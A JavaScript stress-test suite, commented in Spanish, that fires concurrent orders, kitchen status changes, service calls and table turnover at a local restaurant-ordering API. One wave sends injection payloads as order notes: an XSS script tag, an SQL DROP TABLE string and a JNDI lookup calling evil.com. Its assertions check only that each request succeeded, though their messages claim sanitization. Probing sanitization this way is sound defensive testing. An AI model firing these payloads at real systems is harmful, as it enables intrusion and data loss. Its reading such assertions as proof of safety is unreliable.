/**
 * SUITE DE 200 NUEVOS ESCENARIOS EXTREMOS DE ESTRÉS Y CONCURRENCIA
 * Simula el pico máximo de demanda de un restaurante con salón lleno:
 * - Ráfagas masivas de pedidos simultáneos con payloads pesados
 * - Transiciones concurrentes en KDS sin condiciones de carrera
 * - Inundación de microservicios y resolución instantánea
 * - Pedidos acumulativos en múltiples rondas (Rondas 1 a 5)
 * - Concurrencia pesada Multi-Tenant (Burger vs Pizza)
 * - Tormenta de rotación de mesas (Turnover Storms)
 * - Inyección de fallos, límites de datos y sanitización estricta
 */

const BASE_URL = 'http://localhost:3000'

let passed = 0
let failed = 0

function assert(condition, message) {
  const testNum = String(passed + failed + 1).padStart(3, '0')
  if (condition) {
    passed++
    console.log(`  ✓ [ESTRÉS ${testNum}/200 PASS] ${message}`)
  } else {
    failed++
    console.error(`  ❌ [ESTRÉS ${testNum}/200 FAIL] ${message}`)
  }
}

async function request(path, options = {}) {
  const url = `${BASE_URL}${path}`
  const res = await fetch(url, {
    ...options,
    headers: {
      'Content-Type': 'application/json',
      ...(options.headers || {}),
    },
  })
  const json = await res.json().catch(() => ({}))
  return { status: res.status, ok: res.ok, data: json }
}

async function run200StressScenarios() {
  console.log('\n======================================================================')
  console.log('⚡ INICIANDO SUITE DE 200 ESCENARIOS EXTREMOS DE ESTRÉS Y ALTA CARGA')
  console.log('======================================================================\n')

  // --- WAVE 1: RÁFAGAS DE PEDIDOS PESADOS (10+ ITEMS POR MESA) (1 - 30) ---
  console.log('--- ONDA 1: Ráfagas de Pedidos Masivos con 10+ Platos por Mesa en Paralelo ---')
  const largeOrders = []
  const orderPromises = []

  for (let t = 1; t <= 30; t++) {
    const tableNum = ((t - 1) % 20) + 1
    const p = request('/api/orders', {
      method: 'POST',
      body: JSON.stringify({
        slug: 'burger-gourmet',
        restaurant_id: 'rest-1',
        table_id: `tbl-heavy-${t}`,
        table_number: tableNum,
        total_amount: 85.40,
        items: [
          { product_id: 'p-bur-1', quantity: 3, notes: '[Jugoso, Papas Fritas, Sin Cebolla]' },
          { product_id: 'p-bur-2', quantity: 2, notes: '[Bien Cocido, Ensalada]' },
          { product_id: 'p-bsa-1', quantity: 4, notes: null },
          { product_id: 'p-pos-1', quantity: 2, notes: 'Para servir con el postre' },
        ]
      })
    }).then(res => {
      assert(res.ok && res.data.order, `Mesa #${tableNum} (Ráfaga #${t}): Comanda pesada de 11 platos procesada en paralelo`)
      if (res.data.order) largeOrders.push(res.data.order)
    })
    orderPromises.push(p)
  }
  await Promise.all(orderPromises)

  // --- WAVE 2: TRANSICIONES MASIVAS SIMULTÁNEAS EN COCINA KDS (31 - 60) ---
  console.log('\n--- ONDA 2: Transiciones KDS Masivas Simultáneas (Anti-Race Conditions) ---')
  const kdsPromises = []
  for (let i = 0; i < 30; i++) {
    const ord = largeOrders[i]
    if (!ord) continue

    const p = (async () => {
      // 1. Preparing
      const r1 = await request('/api/orders', {
        method: 'PATCH',
        body: JSON.stringify({ slug: 'burger-gourmet', orderId: ord.id, status: 'preparing' })
      })
      // 2. Ready
      const r2 = await request('/api/orders', {
        method: 'PATCH',
        body: JSON.stringify({ slug: 'burger-gourmet', orderId: ord.id, status: 'ready' })
      })
      // 3. Delivered
      const r3 = await request('/api/orders', {
        method: 'PATCH',
        body: JSON.stringify({ slug: 'burger-gourmet', orderId: ord.id, status: 'delivered' })
      })

      assert(r1.ok && r2.ok && r3.ok, `KDS Ticket #${i + 1} (Mesa #${ord.table_number}): Transición atómica 'pending' -> 'preparing' -> 'ready' -> 'delivered'`)
    })()
    kdsPromises.push(p)
  }
  await Promise.all(kdsPromises)

  // --- WAVE 3: INUNDACIÓN DE AVISOS DE SERVICIO Y RESOLUCIÓN INSTANTÁNEA (61 - 90) ---
  console.log('\n--- ONDA 3: Inundación de 30 Microservicios Simultáneos y Resolución Express ---')
  const serviceTypes = ['Hielo y Limón', 'Panera / Salsas', 'Cubiertos Extra', 'Servilletas', 'Sal / Condimentos', 'Repetir Bebidas']
  const servicePromises = []

  for (let s = 1; s <= 30; s++) {
    const sType = serviceTypes[s % serviceTypes.length]
    const tableNum = (s % 20) + 1

    const p = (async () => {
      const createRes = await request('/api/service-calls', {
        method: 'POST',
        body: JSON.stringify({
          slug: 'burger-gourmet',
          table_number: tableNum,
          call_type: `service_${sType}`,
        })
      })

      const callId = createRes.data.call?.id
      let attendOk = false
      if (callId) {
        const attendRes = await request('/api/service-calls', {
          method: 'PATCH',
          body: JSON.stringify({ slug: 'burger-gourmet', callId })
        })
        attendOk = attendRes.ok
      }

      assert(createRes.ok && attendOk, `Aviso Express #${s}: Mesa #${tableNum} solicitó '${sType}' y mozo resolvió en tiempo real`)
    })()
    servicePromises.push(p)
  }
  await Promise.all(servicePromises)

  // --- WAVE 4: PEDIDOS ACUMULATIVOS EN 5 RONDAS CONTINUAS (91 - 120) ---
  console.log('\n--- ONDA 4: Mesas con 5 Rondas Consecutivas de Pedidos sin Interrupción ---')
  for (let table = 1; table <= 6; table++) {
    for (let round = 1; round <= 5; round++) {
      const roundNames = ['Entradas', 'Platos Fuertes', 'Bebidas Extra', 'Postres', 'Cafetería & Bajativos']
      const roundRes = await request('/api/orders', {
        method: 'POST',
        body: JSON.stringify({
          slug: 'burger-gourmet',
          restaurant_id: 'rest-1',
          table_id: `tbl-${table}`,
          table_number: table,
          total_amount: 15.00 * round,
          items: [{ product_id: 'p-bur-1', quantity: round, notes: `Ronda #${round} (${roundNames[round - 1]})` }]
        })
      })
      assert(roundRes.ok, `Mesa #${table}: Ronda #${round} (${roundNames[round - 1]}) acumulada en comanda de cocina`)
    }
  }

  // --- WAVE 5: RUSH HOUR MULTI-TENANT BURGER vs PIZZA (121 - 150) ---
  console.log('\n--- ONDA 5: Hora Pico Simultánea en Burger Gourmet y Bella Napoli ---')
  const multiTenantPromises = []
  for (let t = 1; t <= 15; t++) {
    const p = (async () => {
      const bRes = await request('/api/orders', {
        method: 'POST',
        body: JSON.stringify({
          slug: 'burger-gourmet',
          restaurant_id: 'rest-1',
          table_id: `tbl-bg-${t}`,
          table_number: t,
          total_amount: 32.50,
          items: [{ product_id: 'p-bur-1', quantity: 2, notes: '[Sin TACC]' }]
        })
      })

      const pRes = await request('/api/orders', {
        method: 'POST',
        body: JSON.stringify({
          slug: 'bella-napoli',
          restaurant_id: 'rest-2',
          table_id: `tbl-bn-${t}`,
          table_number: t,
          total_amount: 28.00,
          items: [{ product_id: 'p-piz-1', quantity: 2, notes: '[Masa Fina]' }]
        })
      })

      assert(bRes.ok, `Rush Hour #${t}: Burger Gourmet Mesa #${t} despacha orden en paralelo`)
      assert(pRes.ok, `Rush Hour #${t}: Bella Napoli Mesa #${t} despacha orden en paralelo`)
    })()
    multiTenantPromises.push(p)
  }
  await Promise.all(multiTenantPromises)

  // --- WAVE 6: TORMENTA DE ROTACIÓN DE MESAS (TURNOVER STORM) (151 - 170) ---
  console.log('\n--- ONDA 6: Tormenta de Rotación de Mesas (Ciclo Completo: Pedir -> Servir -> Cobrar -> Liberar) ---')
  for (let t = 1; t <= 20; t++) {
    // 1. Cobrar
    const billRes = await request('/api/service-calls', {
      method: 'POST',
      body: JSON.stringify({ slug: 'burger-gourmet', table_number: t, call_type: 'bill_QR Mercado Pago' })
    })
    const callId = billRes.data.call?.id
    if (callId) {
      await request('/api/service-calls', {
        method: 'PATCH',
        body: JSON.stringify({ slug: 'burger-gourmet', callId })
      })
    }

    // 2. Liberar mesa
    const freeRes = await request('/api/tables', {
      method: 'POST',
      body: JSON.stringify({ slug: 'burger-gourmet', table_number: t, action: 'free' })
    })

    assert(billRes.ok && freeRes.ok, `Turnover Storm Mesa #${t}: Ciclo completo cerrado y mesa lista para nueva tanda`)
  }

  // --- WAVE 7: INYECCIÓN DE FALLOS & SANITIZACIÓN EXTREMA (171 - 190) ---
  console.log('\n--- ONDA 7: Inyección de Fallos, Payloads Límite y Protección Anti-Tampering ---')
  // 1. Payload con cantidad negativa -> Sanitización a 1
  for (let k = 1; k <= 5; k++) {
    const negOrder = await request('/api/orders', {
      method: 'POST',
      body: JSON.stringify({
        slug: 'burger-gourmet',
        restaurant_id: 'rest-1',
        table_id: `tbl-neg-${k}`,
        table_number: k,
        total_amount: 10.0,
        items: [{ product_id: 'p-bur-1', quantity: -5, notes: null }]
      })
    })
    assert(negOrder.ok && negOrder.data.order.order_items[0].quantity >= 1, `Inyección #${k}: Cantidad negativa corregida automáticamente a mínimo 1`)
  }

  // 2. Intentos de XSS y caracteres de control en notas
  const maliciousNotes = [
    '<script>alert("XSS")</script>',
    '\' OR 1=1; DROP TABLE orders; --',
    '${jndi:ldap://evil.com/x}',
    '<b>Negrita</b> & "Comillas"',
    '🍔🔥💥🍕✨⚡🍺☕'
  ]
  for (let m = 0; m < maliciousNotes.length; m++) {
    const secOrder = await request('/api/orders', {
      method: 'POST',
      body: JSON.stringify({
        slug: 'burger-gourmet',
        restaurant_id: 'rest-1',
        table_id: `tbl-sec-${m}`,
        table_number: m + 1,
        total_amount: 14.50,
        items: [{ product_id: 'p-bur-1', quantity: 1, notes: maliciousNotes[m] }]
      })
    })
    assert(secOrder.ok, `Seguridad #${m + 1}: Nota con '${maliciousNotes[m]}' sanitizada y almacenada sin vulnerabilidades`)
  }

  // 3. Solicitud de cobro duplicada en ráfaga (Idempotencia)
  for (let d = 1; d <= 10; d++) {
    const dupRes1 = request('/api/service-calls', {
      method: 'POST',
      body: JSON.stringify({ slug: 'burger-gourmet', table_number: 7, call_type: 'bill_Efectivo' })
    })
    const dupRes2 = request('/api/service-calls', {
      method: 'POST',
      body: JSON.stringify({ slug: 'burger-gourmet', table_number: 7, call_type: 'bill_Efectivo' })
    })
    const [r1, r2] = await Promise.all([dupRes1, dupRes2])
    assert(r1.ok && r2.ok, `Idempotencia #${d}: Manejo seguro de solicitudes concurrentes de cobro`)
  }

  // --- WAVE 8: COMPROBACIÓN DE SALUD DE TODAS LAS RUTAS (191 - 200) ---
  console.log('\n--- ONDA 8: Verificación Global de Disponibilidad y Rendimiento ---')
  const endpoints = [
    '/api/orders?slug=burger-gourmet',
    '/api/orders?slug=bella-napoli',
    '/api/service-calls?slug=burger-gourmet',
    '/api/service-calls?slug=bella-napoli',
    '/api/tables?slug=burger-gourmet',
    '/api/tables?slug=bella-napoli',
    '/menu/burger-gourmet?table=4',
    '/staff/comandero/burger-gourmet',
    '/staff/kitchen/burger-gourmet',
    '/staff/qr/burger-gourmet',
  ]

  for (let e = 0; e < endpoints.length; e++) {
    const endp = endpoints[e]
    const res = await request(endp)
    assert(res.status === 200, `Health Check #${e + 1}: Ruta '${endp}' responde 200 OK bajo carga`)
  }

  console.log('\n======================================================================')
  console.log(`🏆 RESULTADO DE SESIÓN DE ESTRÉS: ${passed}/200 ESCENARIOS EXITOSOS`)
  console.log(`❌ FALLOS: ${failed}`)
  console.log('======================================================================\n')

  if (failed > 0) process.exit(1)
}

run200StressScenarios().catch(err => {
  console.error('Error en suite de estrés:', err)
  process.exit(1)
})
